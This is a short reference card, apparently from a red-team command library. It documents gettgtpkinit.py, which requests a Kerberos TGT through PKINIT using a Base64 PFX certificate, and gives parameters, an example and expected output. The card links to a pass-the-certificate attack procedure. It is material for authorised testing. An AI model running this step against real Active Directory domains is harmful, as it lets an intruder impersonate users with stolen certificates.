---
id: f0c01dd5-d60f-4842-a756-b0aece154141
name: get-tgt-base64-pfx-certificate
type: command
executor: python
data: >-
  gettgtpkinit.py -pfx-base64 $(cat $_B64_PFX_FILE) $_DOMAIN/$_TARGET_USER
  -hashes :$_PASSWORD $_TGT_CCACHE
output: null
created_at: '2023-04-06T03:56:06.176726+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - tgt
  - pkinit
verified: true
validated: true
---

# get-tgt-base64-pfx-certificate

## Command

```python
gettgtpkinit.py -pfx-base64 $(cat $_B64_PFX_FILE) $_DOMAIN/$_TARGET_USER -hashes :$_PASSWORD $_TGT_CCACHE
```

## Description

Requests a Kerberos TGT using a Base64-encoded PFX certificate via PKINIT protocol.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -pfx-base64 | Base64 string of PFX (via cat) | Yes |
| $_DOMAIN/$_TARGET_USER | Target domain and username (e.g., domain.local/admin) | Yes |
| -hashes | Optional NTLM hash (empty for cert-only) | No |
| $_TGT_CCACHE | Output ccache file path | Yes |

## Examples

### Basic Usage

```python
gettgtpkinit.py -pfx-base64 $(cat cert.b64) domain.local/user tgt.ccache
```

## Expected Output

TGT for user@domain.local saved to tgt.ccache
Kerberos ticket issued successfully.

## Related

- [[procedures/Pass-The-Certificate-Attack]]
